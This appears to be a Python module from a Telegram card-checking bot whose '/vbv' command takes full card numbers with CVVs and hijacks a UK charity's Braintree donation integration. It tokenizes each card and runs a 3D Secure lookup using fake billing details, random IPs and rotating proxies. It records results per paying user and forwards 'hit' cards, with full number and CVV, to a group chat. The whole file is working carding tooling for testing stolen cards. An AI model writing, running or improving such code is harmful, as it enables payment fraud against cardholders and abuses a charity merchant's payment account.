"""vbv.py — Braintree 3DS2 with check recording"""

import re, asyncio, base64, json, random, time, uuid, logging
import aiohttp
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler
from bin import get_bin_info
from database import get_active_proxy_strings, record_check
from emojis import PremiumEmoji as E
from config import OWNER_ID, OWNER_USERNAME, OWNER_NAME

logger = logging.getLogger(__name__)

_SITE = "https://cllsupport.org.uk"
_DONATE = f"{_SITE}/donate/"
_GQL = "https://payments.braintree-api.com/graphql"
_BT = "https://api.braintreegateway.com"
_TO = 45

UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
       "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0"]
_H = {"Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
      "Accept-Language": "en-GB,en;q=0.9"}
_SM = {"authenticate_successful": "Passed", "authenticate_attempt_successful": "Passed",
       "lookup_error": "Error", "authenticate_error": "Error", "no_response": "Failed"}
_EM = {"authenticate_successful": "ENROLLED", "authenticate_attempt_successful": "ENROLLED",
       "lookup_error": "NOT_ENROLLED", "authenticate_error": "NOT_ENROLLED", "no_response": "UNKNOWN"}


def _px_to_ai(p):
    if not p: return None
    p = p.strip()
    if p.startswith(("http://", "https://")): return p
    parts = p.split(":")
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"http://{p}"
    return f"http://{p}"


def _pick_px(pxs):
    if not pxs: return None
    return _px_to_ai(random.choice(pxs))


def _parse_card(s):
    s = s.strip()
    for pat in [r'^(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})$',
                r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$']:
        m = re.match(pat, s)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 2: yy = "20" + yy
            return {"number": cc, "month": mm, "year": yy, "cvv": cvv}
    return None


async def _get_auth(session, proxy):
    for _ in range(3):
        try:
            async with session.get(_DONATE, headers={**_H, "User-Agent": random.choice(UAS)},
                                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=25)) as r:
                text = await r.text()
            m = re.search(r'name="clientToken"\s+value="([^"]+)"', text)
            if not m: m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', text)
            if m:
                try:
                    d = json.loads(base64.b64decode(m.group(1)).decode())
                    a = d.get("authorizationFingerprint", ""); mm = d.get("merchantId", "")
                    if a and mm: return a, mm
                except: pass
            a = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', text)
            mi = re.search(r'"merchantId"\s*:\s*"([^"]+)"', text)
            if a: return a.group(1), (mi.group(1) if mi else "dyb5fmjx5t5wxckj")
        except: await asyncio.sleep(1)
    return None, None


async def _tokenize(session, auth, card, proxy):
    q = ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
         "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }")
    body = {"clientSdkMetadata": {"source": "client", "integration": "custom",
            "sessionId": str(uuid.uuid4())}, "query": q,
            "variables": {"input": {"creditCard": {"number": card["number"],
                "expirationMonth": card["month"], "expirationYear": card["year"],
                "cvv": card["cvv"]}, "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard"}
    headers = {**_H, "Authorization": f"Bearer {auth}", "Braintree-Version": "2018-05-10",
               "Content-Type": "application/json", "User-Agent": random.choice(UAS)}
    async with session.post(_GQL, headers=headers, json=body, proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=30)) as r:
        d = await r.json(content_type=None)
    if "errors" in d: return None, None
    t = d["data"]["tokenizeCreditCard"]
    return t["token"], t["creditCard"].get("last4", "")


async def _lookup(session, auth, merch, token, card, proxy):
    url = f"{_BT}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    payload = {"amount": "1.00", "browserColorDepth": 24, "browserJavaEnabled": False,
               "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
               "browserScreenHeight": 800, "browserScreenWidth": 360,
               "browserTimeZone": -345, "deviceChannel": "Browser",
               "additionalInfo": {"ipAddress": ".".join(str(random.randint(1, 254)) for _ in range(4)),
                   "billingLine1": "New York", "billingCity": "New York", "billingState": "NY",
                   "billingPostalCode": "10080", "billingCountryCode": "US",
                   "billingPhoneNumber": "998773772", "billingGivenName": "John",
                   "billingSurname": "Doe", "email": "test@example.com"},
               "bin": card["number"][:6], "dfReferenceId": f"0_{uuid.uuid4()}",
               "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.115.1",
                   "cardinalDeviceDataCollectionTimeElapsed": random.randint(400, 2000),
                   "issuerDeviceDataCollectionTimeElapsed": random.randint(800, 5000),
                   "issuerDeviceDataCollectionResult": True},
               "authorizationFingerprint": auth, "braintreeLibraryVersion": "braintree/web/3.115.1",
               "_meta": {"merchantAppId": "cllsupport.org.uk", "platform": "web",
                   "sdkVersion": "3.115.1", "source": "client", "integration": "custom",
                   "integrationType": "custom", "sessionId": str(uuid.uuid4())}}
    headers = {**_H, "Content-Type": "application/json", "User-Agent": random.choice(UAS)}
    async with session.post(url, headers=headers, json=payload, proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=_TO)) as r:
        if r.status in (200, 201):
            t = await r.text()
            if t.strip(): return json.loads(t)
    return {}


def _status(l):
    try: return l["paymentMethod"]["threeDSecureInfo"]["status"]
    except:
        s = json.dumps(l)
        for c in _SM:
            if c in s: return c
    return "no_response"


def _enroll(l, c):
    try:
        r = l["paymentMethod"]["threeDSecureInfo"]["enrolled"]
        if r == "Y": return "ENROLLED"
        if r == "N": return "NOT_ENROLLED"
        if r == "U": return "UNKNOWN"
    except: pass
    return _EM.get(c, "UNKNOWN")


async def check_vbv(card_s, proxies):
    t0 = time.time()
    card = _parse_card(card_s)
    if not card:
        return {"vbv_status": "Error", "vbv_response": "Bad card",
                "vbv_enrolled": "?", "vbv_elapsed": 0}
    px = _pick_px(proxies)
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False),
                                          cookie_jar=aiohttp.CookieJar()) as s:
            s.cookie_jar.update_cookies({"cookie_test": "please_accept_for_session"})
            auth, merch = await _get_auth(s, px)
            if not auth: return {"vbv_status": "Error", "vbv_response": "auth_fail",
                                  "vbv_enrolled": "?", "vbv_elapsed": time.time()-t0}
            tok, _ = await _tokenize(s, auth, card, px)
            if not tok: return {"vbv_status": "Error", "vbv_response": "tok_fail",
                                 "vbv_enrolled": "?", "vbv_elapsed": time.time()-t0}
            l = await _lookup(s, auth, merch, tok, card, px)
            c = _status(l); st = _SM.get(c, "Unknown"); en = _enroll(l, c)
            return {"vbv_status": st, "vbv_response": c, "vbv_enrolled": en,
                    "vbv_elapsed": time.time() - t0}
    except Exception as e:
        return {"vbv_status": "Error", "vbv_response": str(e)[:60],
                "vbv_enrolled": "?", "vbv_elapsed": time.time()-t0}


def _extract(t):
    if not t: return None
    pat = re.compile(r'(\d{13,19})\s*[|/:\s]\s*(\d{1,2})\s*[|/:\s]\s*(\d{2,4})\s*[|/:\s]\s*(\d{3,4})')
    m = pat.search(t)
    if m:
        cc, mm, yy, cvv = m.groups()
        mm = mm.zfill(2)
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None


def _fmt(r, cs, info, uid, fn, tier):
    vs = r["vbv_status"]; vr = r["vbv_response"]; ve = r["vbv_enrolled"]; el = r["vbv_elapsed"]
    em = "✅" if "passed" in vs.lower() else "❌"
    b = (info.get("scheme") or "N/A").title(); is_ = info.get("bank") or "N/A"
    co = info.get("country") or "Unknown"; cof = info.get("country_emoji", "")
    st = f"<b>𝙋𝘼𝙎𝙎𝙀𝘿</b> {em}" if "passed" in vs.lower() else (
         f"<b>𝙀𝙍𝙍𝙊𝙍</b> {em}" if "error" in vs.lower() else f"<b>{vs.upper()}</b> {em}")
    ul = f"<a href='tg://user?id={uid}'>{fn}</a> <code>[{tier}]</code>"
    return (f"<blockquote>{E.THUNDER} <b>VBV</b> ↬ {st}</blockquote>\n"
            f"{E.CARD} <b>Card</b>\n⤷ <code>{cs}</code>\n"
            f"{E.RESPONSE} <b>Resp</b> ↬ <code>{vr}</code>\n"
            f"{E.GATE} <b>Enrolled</b> ↬ <code>{ve}</code>\n"
            f"<blockquote><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ {b}\n<b>𝑩𝒂𝒏𝒌</b> ↬ {is_}\n"
            f"<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ {co} {cof}</blockquote>\n"
            f"{E.ELAPS} <b>Time</b> ↬ <code>{el:.2f}s</code>\n"
            f"{E.USER} <b>User</b> ↬ {ul}\n"
            f"{E.LINK} <b>Dev</b> ↬ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>")


async def handle_vbv_command(update, context):
    from plans import get_user_current_tier
    u = update.effective_user; uid = u.id; fn = u.first_name
    tier = get_user_current_tier(uid)
    proxies = get_active_proxy_strings(OWNER_ID) or []
    if not proxies:
        await update.message.reply_text(
            f"<blockquote>{E.WARNING} <b>No Proxies</b></blockquote>",
            parse_mode="HTML")
        return
    cs = None
    if context.args: cs = " ".join(context.args).strip()
    if not cs and update.message.reply_to_message:
        rt = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        cs = _extract(rt)
    if not cs:
        await update.message.reply_text(f"{E.INFO} <code>/vbv cc|mm|yy|cvv</code>",
                                         parse_mode="HTML")
        return
    card = _parse_card(cs)
    if not card:
        ex = _extract(cs)
        if ex: card = _parse_card(ex); cs = ex
    if not card:
        await update.message.reply_text(f"{E.ERROR} Bad format.", parse_mode="HTML")
        return
    cs = f"{card['number']}|{card['month']}|{card['year'][2:]}|{card['cvv']}"
    prog = await update.message.reply_text(
        f"<blockquote>🔄 <b>VBV...</b></blockquote>\n<pre>{cs}</pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>Braintree 3DS2</i>", parse_mode="HTML")
    async def bg():
        r = await check_vbv(cs, proxies)
        try: info = await get_bin_info(card["number"][:6])
        except: info = {}
        txt = _fmt(r, cs, info, uid, fn, tier)
        try: await prog.edit_text(txt, parse_mode="HTML")
        except:
            try: await update.message.reply_text(txt, parse_mode="HTML")
            except: pass

        # ═══ RECORD CHECK ═══
        try:
            if r["vbv_status"] == "Passed":
                record_check(uid, "approved", "VBV", cs)
            else:
                record_check(uid, "declined", "VBV", cs)
        except: pass

        if r["vbv_status"] == "Passed":
            try:
                await context.bot.send_message(
                    chat_id=HIT_DETECTION_GROUP_ID,
                    text=(f"<blockquote>{E.FIRE} <b>VBV HIT</b></blockquote>\n"
                          f"{E.CARD} <b>Card</b> ↬ <code>{cs}</code>\n"
                          f"{E.RESPONSE} <b>Resp</b> ↬ <code>{r['vbv_response']}</code>\n"
                          f"{E.USER} <b>User</b> ↬ <a href='tg://user?id={uid}'>{fn}</a>"),
                    parse_mode="HTML")
            except: pass
    asyncio.create_task(bg())


def register_vbv(app):
    app.add_handler(CommandHandler("vbv", handle_vbv_command))